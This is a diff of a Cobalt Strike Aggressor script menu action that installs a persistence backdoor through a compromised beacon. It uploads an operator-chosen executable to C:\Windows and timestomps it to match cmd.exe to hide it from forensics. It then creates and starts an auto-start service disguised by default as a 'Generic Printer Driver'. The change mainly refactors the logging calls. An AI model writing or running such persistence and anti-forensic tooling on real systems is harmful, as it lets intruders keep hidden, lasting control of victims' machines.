@@ -61,23 +61,23 @@ popup beacon_bottom {
 			#	* build out a proper Java Swing menu to customize the options
 			foreach $bid ($1){
 				prompt_file_open("Select the service exe to use", $null, false, {
-					println("\c4Uploading backdoor on beacon $1 using file $2");
-					blog($1, "Attempting to publish backdoor service");
-					bcd($1, "C:\\Windows\\");
-					println("\c4Changed directory on beacon $1 to C:\\Windows\\");
-					bupload($1, $2);
+					blog($bid, "\c4Uploading backdoor on beacon $1 using file $2");
+					blog($bid, "Attempting to publish backdoor service");
+					bcd($bid, "C:\\Windows\\");
+					blog($bid, "\c4Changed directory on beacon $1 to C:\\Windows\\");
+					bupload($bid, $2);
 					servicefilename($2);
-					btimestomp($1, "$servicebackdoorfilename", "C:\\Windows\\system32\\cmd.exe")
+					btimestomp($bid, "$servicebackdoorfilename", "C:\\Windows\\system32\\cmd.exe")
 					prompt_text("Name of service to use?", "GenericPrinterDriver", {
 						$serviceName = $1;
 					});
 					prompt_text("Service Display Name to use?", "Generic Printer Driver Support", {
 						$serviceDisplayName = $1;
 					});
-					bshell($1, "sc create $serviceName binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \" $serviceDisplayName \"");
-					bshell($1, "sc start $serviceName ");
-					blog($1, "Backdoor service created using $servicebackdoorfilename ");
-					println("\c9[+] Backdoor creation complete!");
+					bshell($bid, "sc create $serviceName binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \" $serviceDisplayName \"");
+					bshell($bid, "sc start $serviceName ");
+					blog($bid, "Backdoor service created using $servicebackdoorfilename ");
+					blog($bid, "\c9[+] Backdoor creation complete!");
 				});
 			}
 		}
